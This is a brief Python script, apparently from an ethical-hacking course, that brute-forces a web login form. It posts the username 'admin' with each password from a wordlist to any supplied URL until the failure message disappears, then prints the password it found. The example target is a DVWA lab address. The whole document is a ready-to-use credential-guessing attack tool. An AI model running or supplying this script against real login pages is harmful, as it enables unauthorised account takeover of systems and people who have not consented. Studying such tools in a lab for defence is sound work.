# Login Cracker

#!/use/bin/env python
import requests, optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="URL of site\'s login page (Ex.: http://10.0.2.13/dvwa/login.php)")
    parser.add_option("-w", "--wordlist", dest="wordlist", help="Path to wordlist")
    (options, arguments) = parser.parse_args()
    if not options.url:
        parser.error("[-] Please specify the URL of site\'s login page (Ex.: http://10.0.2.13/dvwa/login.php). Use --help for more info.")
    if not options.wordlist:
        parser.error("[-] Please specify a path to wordlist. Use --help for more info.")
    return options

options = get_arguments()
target_url = options.url
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open(options.wordlist, "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()
print("[+] Reached end of line.")

'''
https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10666162?start=0 (Guessing Login Information on Login Pages)
'''